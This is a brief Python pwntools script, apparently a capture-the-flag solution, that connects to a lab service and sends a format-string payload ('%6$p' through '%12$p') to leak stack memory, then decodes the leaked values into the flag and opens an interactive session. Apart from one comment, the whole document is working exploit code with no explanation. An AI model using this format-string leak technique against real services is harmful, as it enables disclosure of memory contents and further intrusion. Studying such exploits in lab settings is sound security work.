from pwn import *

"""
- Took me alot of time because i forgot to execute the code remotely and 
locally the flag i found is wrong (reducted)
"""

IP = "10.10.5.120"

PORT = 9006

io = remote(IP, PORT)

print(io.recvuntil(b'giveaway: ').decode('latin-1'))

io.sendline(b"%6$p %7$p %8$p %9$p %10$p %11$p %12$p")

data = io.recv().decode('latin-1').rstrip("}").split(" ")[1:]

flag = ""

for idx in data:
	idx = int(idx, 16)
	flag += p64(idx).decode('latin-1')

flag = flag[:flag.find("}")+1]

log.info(flag)

io.interactive()
